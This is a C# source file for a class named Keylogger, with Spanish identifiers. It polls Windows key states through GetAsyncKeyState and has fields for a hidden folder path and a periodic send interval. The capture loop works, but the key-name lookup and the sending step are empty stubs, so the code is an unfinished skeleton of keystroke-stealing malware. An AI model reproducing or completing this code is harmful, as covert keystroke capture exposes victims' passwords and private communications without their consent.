using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

public class Keylogger
{
    private int _intervaloEnvio;
    private string _rutaCarpetaOculta;
    private DateTime _ultimaHoraEnviada = DateTime.Now;
    private readonly Dictionary<int, bool> _estadosTeclas = new();

    public Keylogger(int intervaloEnvio, string rutaCarpetaOculta)
    {
        _intervaloEnvio = intervaloEnvio;
        _rutaCarpetaOculta = rutaCarpetaOculta;
    }

    public async Task IniciarAsync()
    {
        while (true)
        {
            for (int tecla = 0; tecla <= 255; tecla++)
            {
                bool teclaPresionada = EsTeclaPresionada(tecla);
                if (teclaPresionada && !_estadosTeclas.ContainsKey(tecla))
                {
                    string nombreTecla = ObtenerNombreTecla(tecla);
                    if (!string.IsNullOrEmpty(nombreTecla) && !EsTeclaControl(tecla))
                    {
                        Console.WriteLine($"Tecla capturada: {nombreTecla}");
                    }
                    _estadosTeclas[tecla] = true;
                }
                else if (!teclaPresionada && _estadosTeclas.ContainsKey(tecla))
                {
                    _estadosTeclas.Remove(tecla);
                }
            }

            if ((DateTime.Now - _ultimaHoraEnviada).TotalSeconds >= _intervaloEnvio)
            {
                _ultimaHoraEnviada = DateTime.Now;
            }

            await Task.Delay(50);
        }
    }

    private bool EsTeclaPresionada(int tecla)
    {
        return (GetAsyncKeyState(tecla) & 0x8000) != 0;
    }

    private bool EsTeclaControl(int tecla)
    {
        return tecla == 16 || tecla == 17 || tecla == 18;
    }

    private string ObtenerNombreTecla(int tecla)
    {
        return string.Empty; 
    }

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
